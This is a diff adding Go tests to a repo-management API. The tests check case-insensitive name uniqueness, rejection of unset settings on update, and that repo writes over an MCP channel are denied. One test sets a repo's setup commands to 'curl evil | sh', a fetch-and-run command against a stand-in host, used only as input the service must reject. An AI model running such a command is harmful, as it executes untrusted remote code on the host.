@@ -210,6 +210,50 @@ func TestUpdateRepoErrors(t *testing.T) {
 	assert.Equal(t, connect.CodeInvalidArgument, code(err))
 }
 
+func TestRepoNamesAreUniqueIgnoringCase(t *testing.T) {
+	cleanRepos(t)
+	c := repoClient(t)
+	createRepo(t, c, validRepo("Mixed-Case"))
+
+	_, err := c.CreateRepo(
+		context.Background(),
+		&factoryv1.CreateRepoRequest{Repo: validRepo("mixed-case")},
+	)
+	assert.Equal(t, connect.CodeAlreadyExists, code(err))
+}
+
+func TestUpdateRepoDoesNotResetUnsetSettings(t *testing.T) {
+	cleanRepos(t)
+	c := repoClient(t)
+	repo := createRepo(t, c, validRepo("kept"))
+
+	repo.DefaultHarness = factoryv1.Harness_HARNESS_UNSPECIFIED
+	_, err := c.UpdateRepo(
+		context.Background(), &factoryv1.UpdateRepoRequest{Repo: repo},
+	)
+	assert.Equal(t, connect.CodeInvalidArgument, code(err))
+}
+
+func TestRepoSettingsNeedABrowserSession(t *testing.T) {
+	cleanRepos(t)
+	browser := repoClient(t)
+	repo := createRepo(t, browser, validRepo("guarded"))
+	mcp := newRepoClient(t, true, constants.ChannelMCP)
+	ctx := context.Background()
+
+	_, err := mcp.CreateRepo(ctx, &factoryv1.CreateRepoRequest{Repo: validRepo("sneaky")})
+	assert.Equal(t, connect.CodePermissionDenied, code(err))
+
+	repo.SetupCommands = "curl evil | sh"
+	_, err = mcp.UpdateRepo(ctx, &factoryv1.UpdateRepoRequest{Repo: repo})
+	assert.Equal(t, connect.CodePermissionDenied, code(err))
+
+	// Reading stays open to any admin credential.
+	resp, err := mcp.ListRepos(ctx, &factoryv1.ListReposRequest{})
+	require.NoError(t, err)
+	assert.NotEmpty(t, resp.Repos)
+}
+
 func TestNonAdminDeniedRepos(t *testing.T) {
 	c := newRepoClient(t, false, constants.ChannelBrowser)
 	ctx := context.Background()
